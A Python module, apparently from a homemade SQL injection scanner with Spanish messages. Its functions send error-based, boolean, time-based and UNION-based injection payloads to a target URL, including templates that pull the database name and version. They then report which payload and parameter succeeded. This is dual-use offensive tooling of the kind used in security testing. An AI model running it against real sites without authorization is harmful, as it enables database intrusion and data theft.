import requests
import time
from urllib.parse import parse_qs, urlparse
from core.injector import inject_payload
from payloads.detection import (
    ERROR_PAYLOADS,
    SQL_ERROR_SIGNATURES,
    BOOLEAN_PAYLOADS,
    TIME_PAYLOADS,
    TIME_THRESHOLD
)
from payloads.error_based import MYSQL_ERROR_PAYLOADS
from payloads.union_based import ORDER_BY_TMPL, UNION_NULL_TMPL

def _vprint(enabled: bool, message: str):
    if enabled:
        print(message)


def _build_error_based_payloads() -> list[str]:
    payloads = list(ERROR_PAYLOADS)
    template_queries = ["SELECT DATABASE()", "SELECT VERSION()"]
    for tmpl in MYSQL_ERROR_PAYLOADS:
        for query in template_queries:
            payloads.append(tmpl.replace("{QUERY}", query))
    return payloads


def _union_payload_variants(payload: str) -> list[str]:
    variants = [payload]
    mysql_variant = payload.replace("-- -", "#")
    if mysql_variant not in variants:
        variants.append(mysql_variant)
    return variants


def detect_error_based(session: requests.Session, url: str, method: str, verbose: bool = False) -> bool:
    for payload in _build_error_based_payloads():
        try:
            _vprint(verbose, f"[verbose] Error-based payload: {repr(payload)}")
            r = inject_payload(session, url, method, payload, verbose=verbose)
            _vprint(verbose, f"[verbose] Status: {r.status_code}, len(body): {len(r.text)}")
            body_lower = r.text.lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body_lower:
                    print(f"  [+] Error SQL detectado con payload: {repr(payload)}")
                    print(f"      Firma encontrada: '{sig}'")
                    return True
        except requests.RequestException as e:
            _vprint(verbose, f"[verbose] Error de red con payload {repr(payload)}: {e}")
            continue
    return False

def detect_boolean_based(session: requests.Session, url: str, method: str, verbose: bool = False) -> bool:
    for payload_true, payload_false in BOOLEAN_PAYLOADS:
        try:
            _vprint(verbose, f"[verbose] Boolean TRUE payload: {repr(payload_true)}")
            r_true  = inject_payload(session, url, method, payload_true, verbose=verbose)
            _vprint(verbose, f"[verbose] Boolean FALSE payload: {repr(payload_false)}")
            r_false = inject_payload(session, url, method, payload_false, verbose=verbose)

            len_diff = abs(len(r_true.text) - len(r_false.text))
            _vprint(
                verbose,
                f"[verbose] len(TRUE)={len(r_true.text)}, len(FALSE)={len(r_false.text)}, diff={len_diff}",
            )
            if len_diff > 20:
                print(f"  [+] Diferencia booleana detectada: {len_diff} chars")
                print(f"      TRUE  payload : {repr(payload_true)}")
                print(f"      FALSE payload : {repr(payload_false)}")
                return True
        except requests.RequestException as e:
            _vprint(verbose, f"[verbose] Error de red en prueba booleana: {e}")
            continue
    return False

def detect_time_based(session: requests.Session, url: str, method: str, verbose: bool = False) -> bool:
    for payload in TIME_PAYLOADS:
        try:
            _vprint(verbose, f"[verbose] Time-based payload: {repr(payload)}")
            start = time.time()
            inject_payload(session, url, method, payload, verbose=verbose)
            elapsed = time.time() - start
            _vprint(verbose, f"[verbose] Tiempo medido: {elapsed:.2f}s")
            if elapsed >= TIME_THRESHOLD:
                print(f"  [+] Inyección temporal detectada ({elapsed:.2f}s con payload: {repr(payload)})")
                return True
        except requests.exceptions.Timeout:
            print(f"  [+] Timeout detectado con payload temporal: {repr(payload)}")
            return True
        except requests.RequestException as e:
            _vprint(verbose, f"[verbose] Error de red en prueba temporal: {e}")
            continue
    return False


def detect_union_based(session: requests.Session, url: str, method: str, verbose: bool = False) -> bool:
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    if not params:
        _vprint(verbose, "[verbose] Union-based: no hay parametros para inyectar")
        return False

    for param in params:
        column_count = None
        for n in range(1, 9):
            payload = ORDER_BY_TMPL.format(N=n)
            for variant in _union_payload_variants(payload):
                try:
                    _vprint(verbose, f"[verbose] Union ORDER BY payload ({param}): {repr(variant)}")
                    r = inject_payload(session, url, method, variant, target_param=param, verbose=verbose)
                    body_lower = r.text.lower()
                    if r.status_code >= 500 or any(sig in body_lower for sig in SQL_ERROR_SIGNATURES):
                        column_count = max(1, n - 1)
                        _vprint(verbose, f"[verbose] Union column_count inferido ({param}): {column_count}")
                        break
                except requests.RequestException as e:
                    _vprint(verbose, f"[verbose] Error de red en ORDER BY ({param}): {e}")
                    continue
            if column_count:
                break

        candidate_counts = [column_count] if column_count else list(range(1, 9))
        for count in candidate_counts:
            if not count:
                continue
            for idx in range(count):
                cols = ["NULL"] * count
                marker = "VXUNIONMARK"
                cols[idx] = f"'{marker}'"
                payload = UNION_NULL_TMPL.format(PAD=",".join(cols))
                for variant in _union_payload_variants(payload):
                    try:
                        _vprint(verbose, f"[verbose] Union marker payload ({param}): {repr(variant)}")
                        r = inject_payload(session, url, method, variant, target_param=param, verbose=verbose)
                        if marker.lower() in r.text.lower():
                            print(f"  [+] UNION-based detectado con payload: {repr(variant)}")
                            print(f"      Parametro vulnerable: {param}")
                            return True
                    except requests.RequestException as e:
                        _vprint(verbose, f"[verbose] Error de red en UNION marker ({param}): {e}")
                        continue

    return False
